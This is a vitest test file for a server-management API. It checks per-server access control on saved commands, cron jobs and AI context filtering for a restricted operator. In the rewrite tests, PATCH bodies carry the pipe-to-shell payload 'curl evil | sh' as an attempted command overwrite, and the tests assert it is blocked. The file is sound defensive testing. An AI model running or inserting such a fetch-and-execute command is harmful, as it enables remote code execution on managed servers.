import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { nanoid } from 'nanoid';
import { eq } from 'drizzle-orm';
import { buildApp } from '../app.js';
import { runMigrations } from '../../db/migrate.js';
import { getDb } from '../../db/index.js';
import { cronJobs, resourceGrants, savedCommands } from '../../db/schema.js';
import { ToolExecutor, buildSystemPrompt } from '../../ai/tools.js';
import { seedOrg, seedServer, seedUser } from './test-utils.js';

/**
 * A restricted operator granted server A only. Saved commands bound to server
 * B, and commands that a cron job on server B runs, are out of their reach:
 * B-bound ones are invisible everywhere, and B-used ones cannot be rewritten.
 */
describe('saved commands and per-server access', () => {
  let app: Awaited<ReturnType<typeof buildApp>>;
  let orgId: string;
  let admin: ReturnType<typeof seedUser>;
  let restricted: ReturnType<typeof seedUser>;
  let serverA: string;
  let serverB: string;
  /** Not bound to any server */
  let unbound: string;
  /** Bound to the granted server */
  let boundA: string;
  /** Bound to the ungranted server */
  let boundB: string;
  /** Not bound, but run by a cron job on the ungranted server */
  let usedOnB: string;
  /** Not bound, run by a cron job on the granted server */
  let usedOnA: string;

  const as = (who: { headers: Record<string, string> }) => ({
    get: (url: string) => app.inject({ method: 'GET', url, headers: who.headers }),
    post: (url: string, payload?: object) =>
      app.inject({ method: 'POST', url, headers: who.headers, payload: payload ?? {} }),
    patch: (url: string, payload: object) => app.inject({ method: 'PATCH', url, headers: who.headers, payload }),
    delete: (url: string) => app.inject({ method: 'DELETE', url, headers: who.headers }),
  });

  const commandText = (id: string) =>
    getDb().select({ command: savedCommands.command }).from(savedCommands).where(eq(savedCommands.id, id)).get()
      ?.command;

  function seedCommand(name: string, serverId: string | null = null) {
    const id = nanoid();
    getDb()
      .insert(savedCommands)
      .values({ id, orgId, name, command: `echo ${name}`, serverId, createdBy: admin.userId })
      .run();
    return id;
  }

  function seedJob(serverId: string, savedCommandId: string) {
    getDb()
      .insert(cronJobs)
      .values({
        id: nanoid(),
        orgId,
        serverId,
        savedCommandId,
        name: `job-${savedCommandId}`,
        schedule: '0 * * * *',
        createdBy: admin.userId,
        enabled: false,
      })
      .run();
  }

  beforeAll(async () => {
    await runMigrations();
    orgId = seedOrg('org-commands-access');
    admin = seedUser(orgId, 'admin');
    restricted = seedUser(orgId, 'operator');
    serverA = seedServer(orgId, admin.userId, 'alpha');
    serverB = seedServer(orgId, admin.userId, 'bravo');

    unbound = seedCommand('unbound');
    boundA = seedCommand('bound-a', serverA);
    boundB = seedCommand('bound-b', serverB);
    usedOnB = seedCommand('used-on-b');
    usedOnA = seedCommand('used-on-a');
    seedJob(serverB, usedOnB);
    seedJob(serverA, usedOnA);

    app = await buildApp();
    await app.ready();

    const res = await app.inject({
      method: 'PUT',
      url: `/api/team/members/${restricted.userId}/access`,
      headers: admin.headers,
      payload: { serverAccess: 'restricted', serverIds: [serverA] },
    });
    expect(res.statusCode).toBe(200);
    // A restricted (role-scoped) member reaches no saved command or cron job
    // by default (custom roles spec §8.1); these grants give them all of both,
    // so what is tested here is how the servers narrow that.
    for (const resourceType of ['saved_command', 'cron_job'] as const) {
      getDb()
        .insert(resourceGrants)
        .values({
          id: nanoid(),
          orgId,
          principalType: 'user',
          principalId: restricted.userId,
          resourceType,
          selector: 'all',
          level: 'manage',
        })
        .run();
    }
  });

  afterAll(async () => {
    await app.close();
  });

  describe('reading', () => {
    it('lists only unbound commands and those bound to granted servers', async () => {
      const ids = (await as(restricted).get('/api/commands')).json().map((c: { id: string }) => c.id);
      expect(ids.sort()).toEqual([unbound, boundA, usedOnB, usedOnA].sort());

      const all = (await as(admin).get('/api/commands')).json().map((c: { id: string }) => c.id);
      expect(all).toContain(boundB);
    });

    it('404s single-command routes for a command bound to an ungranted server', async () => {
      expect((await as(restricted).get(`/api/commands/${boundB}/runs`)).statusCode).toBe(404);
      expect((await as(restricted).post(`/api/commands/${boundB}/run`, { serverId: serverA })).statusCode).toBe(404);
      expect((await as(restricted).get(`/api/commands/${boundA}/runs`)).statusCode).toBe(200);
    });

    it('filters the AI context snapshot', async () => {
      const ids = (await as(restricted).get('/api/ai/context')).json().commands.map((c: { id: string }) => c.id);
      expect(ids).not.toContain(boundB);
      expect(ids).toContain(boundA);
      expect(ids).toContain(unbound);
    });

    it('filters the list_saved_commands tool and the system prompt', async () => {
      const tool = new ToolExecutor(orgId, restricted.userId);
      const listed = await tool.execute('list_saved_commands', {});
      expect(listed).toContain('bound-a');
      expect(listed).toContain('unbound');
      expect(listed).not.toContain('bound-b');
      // Asking for the ungranted server's commands by id reveals nothing either
      expect(await tool.execute('list_saved_commands', { server_id: serverB })).toBe('No saved commands.');

      const prompt = buildSystemPrompt({ orgId, userId: restricted.userId });
      expect(prompt).toContain('echo bound-a');
      expect(prompt).not.toContain('echo bound-b');

      const adminPrompt = buildSystemPrompt({ orgId, userId: admin.userId });
      expect(adminPrompt).toContain('echo bound-b');
    });

    it('will not let a cron job reference a command bound to an ungranted server', async () => {
      const res = await as(restricted).post('/api/cron-jobs', {
        serverId: serverA,
        name: 'sneaky',
        schedule: '0 * * * *',
        savedCommandId: boundB,
      });
      expect(res.statusCode).toBe(404);
    });
  });

  describe('rewriting', () => {
    it('404s a PATCH to a command bound to an ungranted server, even without serverId in the body', async () => {
      const res = await as(restricted).patch(`/api/commands/${boundB}`, { command: 'curl evil | sh' });
      expect(res.statusCode).toBe(404);
      expect(commandText(boundB)).toBe('echo bound-b');
    });

    it('403s a PATCH to a command that a cron job on an ungranted server runs', async () => {
      const res = await as(restricted).patch(`/api/commands/${usedOnB}`, { command: 'curl evil | sh' });
      expect(res.statusCode).toBe(403);
      expect(res.json().error).toMatch(/cron job on a server you do not have access to/);
      expect(commandText(usedOnB)).toBe('echo used-on-b');
    });

    it('allows changes within reach', async () => {
      for (const id of [unbound, boundA, usedOnA]) {
        const res = await as(restricted).patch(`/api/commands/${id}`, { name: `renamed-${id}` });
        expect(res.statusCode).toBe(200);
      }
      // Unbinding a granted command is fine; rebinding to an ungranted server is not
      expect((await as(restricted).patch(`/api/commands/${boundA}`, { serverId: serverB })).statusCode).toBe(404);
      expect((await as(restricted).patch(`/api/commands/${boundA}`, { serverId: null })).statusCode).toBe(200);
    });

    it('lets an unrestricted admin edit and delete as before', async () => {
      expect((await as(admin).patch(`/api/commands/${boundB}`, { name: 'still-b' })).statusCode).toBe(200);
      expect((await as(admin).patch(`/api/commands/${usedOnB}`, { name: 'still-used' })).statusCode).toBe(200);
      // Still refused while a cron job uses it, with the existing message
      expect((await as(admin).delete(`/api/commands/${usedOnB}`)).statusCode).toBe(409);
      expect((await as(admin).delete(`/api/commands/${boundB}`)).statusCode).toBe(204);
    });

    it('lets DELETE through manage on the command, still bounded by the servers', async () => {
      // Manage (here from a grant) is what deleting needs; a command a cron job
      // on an ungranted server runs is still out of reach
      expect((await as(restricted).delete(`/api/commands/${usedOnB}`)).statusCode).toBe(403);
      expect((await as(restricted).delete(`/api/commands/${unbound}`)).statusCode).toBe(204);
    });
  });
});
